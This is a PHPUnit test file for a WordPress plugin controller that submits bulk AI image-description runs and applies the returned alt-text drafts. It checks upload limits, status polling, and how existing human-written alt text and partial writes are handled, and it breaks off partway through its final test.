<?php

declare(strict_types=1);

namespace AltContext\Tests\Unit;

use AltContext\Api\DescribeController;
use AltContext\Tests\TestCase;
use WP_REST_Request;

use function glob;
use function is_dir;
use function json_decode;
use function mkdir;
use function rmdir;
use function sys_get_temp_dir;
use function uniqid;
use function unlink;

/**
 * @covers \AltContext\Api\DescribeController
 */
class DescribeRunControllerTest extends TestCase
{
    private DescribeController $controller;
    private string $tempDir;

    protected function setUp(): void
    {
        parent::setUp();
        // Option-write harness state is not cleared by the base TestCase; reset
        // here so a forced-failure test cannot leak into later submits.
        $GLOBALS['__ac_update_option_fail'] = [];
        $GLOBALS['__ac_update_option_calls'] = [];
        $GLOBALS['__ac_option_autoload'] = [];
        $this->setOption('acx_recognition_url', 'http://localhost:8000');
        $this->setOption('acx_recognition_api_key', 'test-key');
        $this->controller = new DescribeController();
        $this->tempDir = sys_get_temp_dir() . '/acx-wbux-3-' . uniqid();
        mkdir($this->tempDir, 0o755, true);
    }

    protected function tearDown(): void
    {
        if (is_dir($this->tempDir)) {
            foreach (glob($this->tempDir . '/*') as $f) {
                @unlink($f);
            }
            @rmdir($this->tempDir);
        }
        parent::tearDown();
    }

    private function plantAttachment(int $id, string $bytes, string $extension = 'jpg'): string
    {
        $path = $this->tempDir . "/{$id}.{$extension}";
        file_put_contents($path, $bytes);
        $GLOBALS['__ac_attached_file'][$id] = $path;
        return $path;
    }

    public function testSubmitBulkDescribeRunSendsMultipartWithImageParts(): void
    {
        $bytes101 = "\xff\xd8\xff\xe0jpeg-101";
        $bytes202 = "\x89PNG\r\n\x1a\npng-202";
        $this->plantAttachment(101, $bytes101, 'jpg');
        $this->plantAttachment(202, $bytes202, 'png');

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => '{"run_id":"11111111-1111-1111-1111-111111111111","status":"pending","phase":"queued","completed":0,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $call = $this->getHttpCalls()[0];
        $this->assertStringContainsString('/scene/describe/run', $call['url']);
        $this->assertSame('POST', $call['method']);

        // request_class 'description' → 180s timeout, no breaker (large/slow bulk upload).
        $this->assertSame(180, $call['args']['timeout']);

        // multipart/form-data body with a boundary Content-Type.
        $this->assertStringContainsString('multipart/form-data; boundary=', (string) $call['args']['headers']['Content-Type']);

        $body = (string) $call['args']['body'];

        // Form field `tenant_id`.
        $this->assertStringContainsString('name="tenant_id"', $body);
        $this->assertStringContainsString(self::currentTenantId(), $body);

        // Form field `media_ids` = JSON int array as string.
        $this->assertStringContainsString('name="media_ids"', $body);
        $this->assertStringContainsString('[101,202]', $body);

        // One `image_<media_id>` file part per id, carrying the raw bytes.
        $this->assertStringContainsString('name="image_101"; filename="101.jpg"', $body);
        $this->assertStringContainsString('Content-Type: image/jpeg', $body);
        $this->assertStringContainsString($bytes101, $body);
        $this->assertStringContainsString('name="image_202"; filename="202.png"', $body);
        $this->assertStringContainsString('Content-Type: image/png', $body);
        $this->assertStringContainsString($bytes202, $body);

        // BR-129 / BR-134: successful submit records the media_id set for later apply.
        $stored = get_option('acx_describe_run_media_ids_11111111-1111-1111-1111-111111111111');
        $this->assertIsArray($stored);
        $this->assertSame([101, 202], $stored['media_ids'] ?? null);
        $this->assertArrayHasKey('created_at', $stored);
    }

    public function testSubmitRejectsMoreThan200MediaIds(): void
    {
        $mediaIds = range(1, 201);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', $mediaIds);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('too_many_media_ids', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        // No silent truncation → no backend dispatch.
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testSubmitRejectsUnreadableAttachmentNamingTheId(): void
    {
        // 101 is readable; 202 has no planted file → load fails, run is rejected.
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_attachment_unreadable', $response->get_error_code());
        $this->assertSame(400, $response->get_error_data()['status'] ?? null);
        $this->assertStringContainsString('202', $response->get_error_message());
        // Fail fast before dispatching a partial run.
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testSubmitRejectsEmptyMediaIds(): void
    {
        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', []);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('missing_media_ids', $response->get_error_code());
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testStatusAndCancelProxyToSceneRunEndpoint(): void
    {
        $runId = '22222222-2222-2222-2222-222222222222';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => '{"run_id":"' . $runId . '","status":"running","phase":"describing","completed":1,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => '{"run_id":"' . $runId . '","status":"cancelled","phase":"cancelled","completed":1,"failed":0,"skipped":1,"total":2,"cancel_requested":true,"gpu_state":null}',
        ]);

        $statusRequest = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId);
        $statusRequest->set_param('run_id', $runId);
        $cancelRequest = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/cancel');
        $cancelRequest->set_param('run_id', $runId);

        $this->controller->get_describe_run_status($statusRequest);
        $this->controller->cancel_describe_run($cancelRequest);

        $calls = $this->getHttpCalls();
        $this->assertStringContainsString('/scene/describe/run/' . $runId, $calls[0]['url']);
        $this->assertSame('GET', $calls[0]['args']['method']);
        // Status polling uses 'post_scan_read' (10s, no breaker) so it never trips
        // the shared recognition circuit breaker during a long run. (PHP-02)
        $this->assertSame(10, $calls[0]['args']['timeout']);
        $this->assertStringContainsString('/scene/describe/run/' . $runId, $calls[1]['url']);
        $this->assertSame('DELETE', $calls[1]['args']['method']);
    }

    public function testSubmitDeduplicatesMediaIdsPreservingFirstSeenOrder(): void
    {
        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
        $this->plantAttachment(202, "\x89PNG\r\n\x1a\npng-202", 'png');

        $this->queueHttpResponse([
            'response' => ['code' => 202, 'message' => 'Accepted'],
            'body' => '{"run_id":"11111111-1111-1111-1111-111111111111","status":"pending","phase":"queued","completed":0,"failed":0,"skipped":0,"total":2,"cancel_requested":false,"gpu_state":null}',
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101, 202, 101, 202, 101]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $body = (string) $this->getHttpCalls()[0]['args']['body'];
        // Distinct, first-seen order preserved; no redundant inference.
        $this->assertStringContainsString('[101,202]', $body);
        $this->assertSame(1, substr_count($body, 'name="image_101"'));
        $this->assertSame(1, substr_count($body, 'name="image_202"'));
    }

    public function testSubmitRejectsRunExceedingBodyCapWith413(): void
    {
        // Shrink the aggregate cap so a small planted file overflows it, without
        // materializing hundreds of MB of test bytes. (PHP-01 / PHP-03)
        add_filter('acx_describe_run_max_body_bytes', static fn (): int => 8);
        $this->plantAttachment(101, 'too-many-bytes-here', 'jpg');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [101]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_payload_too_large', $response->get_error_code());
        $this->assertSame(413, $response->get_error_data()['status'] ?? null);
        $this->assertStringContainsString('101', $response->get_error_message());
        // Rejected before any backend dispatch (and before OOM-buffering).
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testMaxItemsCapIsFilterable(): void
    {
        // Operators align the WP cap with the backend ACX_DESCRIBE_RUN_MAX_ITEMS. (PHP-03)
        add_filter('acx_describe_run_max_items', static fn (): int => 2);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
        $request->set_param('media_ids', [1, 2, 3]);

        $response = $this->controller->submit_describe_run($request);

        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('too_many_media_ids', $response->get_error_code());
        $this->assertStringContainsString('2 media IDs', $response->get_error_message());
        $this->assertSame([], $this->getHttpCalls());
    }

    public function testGetDescribeRunItemsProxiesAndAnnotatesExistingAlt(): void
    {
        // WBUX-4 INT-01b: media 70 already has operator alt text; 71 does not.
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');

        $runId = '11111111-1111-1111-1111-111111111111';
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a cat on a sofa', 'caption' => 'cat', 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => null],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
        $request->set_param('run_id', $runId);

        $response = $this->controller->get_describe_run_items($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        // Read-class proxy: post_scan_read (10s, no shared breaker) like status.
        $call = $this->getHttpCalls()[0];
        $this->assertStringContainsString('/scene/describe/run/' . $runId . '/items', $call['url']);
        $this->assertSame('GET', $call['args']['method']);

        $data = $response->get_data();
        $items = [];
        foreach ($data['items'] as $item) {
            $items[$item['media_id']] = $item;
        }
        // existing_alt bucketing is computed in WP from post meta, not the backend.
        $this->assertTrue($items[70]['existing_alt']);
        $this->assertFalse($items[71]['existing_alt']);
        // Draft passthrough is preserved unchanged.
        $this->assertSame('a cat on a sofa', $items[70]['alt_text_draft']);
        $this->assertSame('a dog in a park', $items[71]['alt_text_draft']);
    }

    public function testGetDescribeRunItemsRequiresRunId(): void
    {
        $request = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs//items');
        $request->set_param('run_id', '');
        $response = $this->controller->get_describe_run_items($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
    }

    private function plantPostType(int $id, string $type = 'attachment'): void
    {
        $GLOBALS['__ac_posts'][$id] = (object) ['ID' => $id, 'post_type' => $type];
    }

    /**
     * BR-129 / BR-134: plant the WP-side submitted media_id set that apply intersects against.
     *
     * @param int[] $mediaIds
     */
    private function plantSubmittedMediaIds(string $runId, array $mediaIds, ?int $createdAt = null): void
    {
        update_option(
            'acx_describe_run_media_ids_' . $runId,
            [
                'media_ids' => array_values($mediaIds),
                'created_at' => $createdAt ?? time(),
            ],
            false
        );
        $index = get_option('acx_describe_run_media_ids_index', []);
        if (!is_array($index)) {
            $index = [];
        }
        $index[$runId] = $createdAt ?? time();
        update_option('acx_describe_run_media_ids_index', $index, false);
    }

    private function queueRunStatusResponse(string $runId, string $status = 'completed'): void
    {
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'status' => $status,
                'phase' => 'complete',
                'completed' => 2,
                'failed' => 0,
                'skipped' => 1,
                'total' => 3,
                'cancel_requested' => false,
                'gpu_state' => null,
            ]),
        ]);
    }

    private function queueRunItemsResponse(string $runId): void
    {
        // media 70: has draft, WILL have existing alt planted by the test.
        // media 71: has draft, no existing alt (safe auto-apply).
        // media 72: failed item, no draft.
        $this->plantSubmittedMediaIds($runId, [70, 71, 72]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'a cat on a sofa', 'caption' => 'cat', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 72, 'status' => 'failed', 'alt_text_draft' => null, 'caption' => null, 'provenance' => null],
                ],
            ]),
        ]);
    }

    public function testApplyRunDraftsAutoAppliesEmptyAltAndGuardsExisting(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        // No overwrite list → existing-alt items are guarded.

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['skipped_invalid']);
        $this->assertSame([], $data['failed']);

        // 71 written; 70 NOT clobbered; provenance persisted for the written item.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('human-authored alt', get_post_meta(70, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('florence', $prov['adapter']);
        // S3-06: WP-stamped bulk-apply provenance is injected on the written item.
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertArrayHasKey('applied_at', $prov);
    }

    public function testApplyRunDraftsOverwritesOnlyExplicitlyListedMedia(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        // Happy path: every fully written id is in applied (not partial).
        $this->assertSame([70, 71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);

        // 70 overwritten because it was explicitly listed.
        $this->assertSame('a cat on a sofa', get_post_meta(70, '_wp_attachment_image_alt', true));
    }

    public function testApplyRejectsNonCompletedRunWith409(): void
    {
        // S3-03: an in-flight run must not have its drafts written.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'running');

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertInstanceOf(\WP_Error::class, $response);
        $this->assertSame('describe_run_not_applicable', $response->get_error_code());
        $this->assertSame(409, $response->get_error_data()['status'] ?? null);
        // Rejected after the status read, before fetching items or writing.
        $this->assertCount(1, $this->getHttpCalls());
        $this->assertSame('', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    public function testApplySkipsNonAttachmentMediaId(): void
    {
        // S3-01: 73 carries a valid draft but is NOT an attachment (a post id the
        // backend echoed) — it must never be stamped onto _wp_attachment_image_alt.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(73, 'post');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [73]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 73, 'status' => 'completed', 'alt_text_draft' => 'not an attachment', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([73], $data['skipped_invalid']);
        $this->assertSame([], $data['applied']);
        // Nothing written to the non-attachment id.
        $this->assertSame('', get_post_meta(73, '_wp_attachment_image_alt', true));
    }

    public function testApplyGuardsPerItemAcrossTwoExistingAltItems(): void
    {
        // S3-06: two existing-alt items, only one opted into overwrite → the guard
        // is per-item, not run-wide.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human 70');
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'human 71');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [70, 71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'draft 70', 'caption' => null, 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'draft 71', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();

        $this->assertSame([70], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame('draft 70', get_post_meta(70, '_wp_attachment_image_alt', true));
        $this->assertSame('human 71', get_post_meta(71, '_wp_attachment_image_alt', true));

        // Injected provenance stamped on the written item.
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        $this->assertArrayHasKey('applied_at', $prov);
        $this->assertSame('florence', $prov['adapter']);
    }

    public function testApplyAllowsCompletedWithErrorsRun(): void
    {
        // D1-01: a partial run (completed_with_errors) is terminal-with-drafts and
        // MUST be applyable — it is not rejected like a still-running run. Proves
        // the 409 gate's ALLOW branch covers partial completions, not just
        // 'completed'.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $this->queueRunStatusResponse($runId, 'completed_with_errors');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Drafts are written despite the partial-failure run status.
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
    }

    public function testApplyRunDraftsBucketsFailedAltWrite(): void
    {
        // D1-02 / S3-02: when the alt-text write returns false AND the stored value
        // does not match the draft (a genuine failure, not a byte-identical no-op),
        // the item lands in `failed`, never `applied`.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71 has a draft and no existing alt → it would normally be applied, but
        // force its alt write to fail (returns false, nothing persisted).
        $GLOBALS['__ac_update_post_meta_fail'][71]['_wp_attachment_image_alt'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertSame([71], $data['failed']);
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        // No provenance stamped on a failed item.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    public function testApplyRunDraftsCountsNoOpWriteAsApplied(): void
    {
        // D1-02 / S3-02: update_post_meta() also returns false for a byte-identical
        // no-op overwrite. The read-back proves the stored value already equals the
        // draft, so the item counts as `applied`, not `failed`.
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        // 70's existing alt already equals its draft; opt into overwrite so it
        // reaches the write path, then force the write to return false (no-op).
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'a cat on a sofa');
        $GLOBALS['__ac_update_post_meta_fail'][70]['_wp_attachment_image_alt'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $request->set_param('overwrite_media_ids', [70]);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertContains(70, $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['failed']);
        // Provenance is still stamped for a no-op-but-applied item.
        $prov = get_post_meta(70, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
    }

    /**
     * Provenance write failure after a verified alt must not report the id as
     * fully applied. Mirrors DescriptionHistoryService::record_correction's
     * description_correction_partial contract in multi-item form: alt stays
     * written; telemetry lag is explicit via `partial`. [RLSE-05] [TEST-15]
     */
    public function testApplyRunDraftsBucketsPartialWhenProvenanceWriteFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71: alt write succeeds, provenance write returns false and stores nothing.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $this->assertSame(200, $response->get_status());

        $data = $response->get_data();
        // Not fully applied — history would skip this id without provenance.
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // Alt landed; provenance did not. Do not imply a total failure.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // BR-82: partial also plants a pending marker scoped to this run+draft.
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);
    }

    /**
     * Partial recovery: after alt lands but provenance fails, a second apply
     * without overwrite_media_ids must complete provenance when the pending
     * marker proves this system started the write for this run+draft.
     * [RLSE-05] [TEST-15]
     */
    public function testApplyRunDraftsRecoversPartialWithoutOverwrite(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // First apply: provenance write fails on 71 → partial + pending marker.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $first->set_param('run_id', $runId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $firstData = $firstResponse->get_data();
        $this->assertSame([], $firstData['applied']);
        $this->assertSame([71], $firstData['partial']);
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'a dog in a park'), $pending['draft_hash']);

        // Clear the forced provenance failure so the retry can succeed.
        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        // Second apply: no overwrite list. Marker + alt===draft + no prov → recover.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $second->set_param('run_id', $runId);
        // Explicitly no overwrite_media_ids — recovery must not require opt-in.

        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $this->assertSame(200, $secondResponse->get_status());

        $data = $secondResponse->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([70], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // Alt unchanged; provenance now stored so history can list the item.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('bulk_describe_run', $prov['source']);
        $this->assertSame($runId, $prov['run_id']);
        // Marker deleted once provenance verifies.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-82: coincidental alt===draft without a pending marker must stay
     * skipped_existing — equality alone is not evidence this system started the
     * write. Goes RED if the marker gate is removed from the fall-through.
     */
    public function testApplyRunDraftsGuardsCoincidentalAltMatchWithoutPendingMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // Operator (or prior partial-inline) text happens to equal the draft.
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'a dog in a park');
        // No provenance, no pending marker — coincidental match only.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        // Alt unchanged; provenance must not be invented for operator text.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-82: pending marker with a different run_id must not unlock recovery.
     */
    public function testApplyRunDraftsGuardsWhenPendingMarkerRunIdDiffers(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => '22222222-2222-2222-2222-222222222222',
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
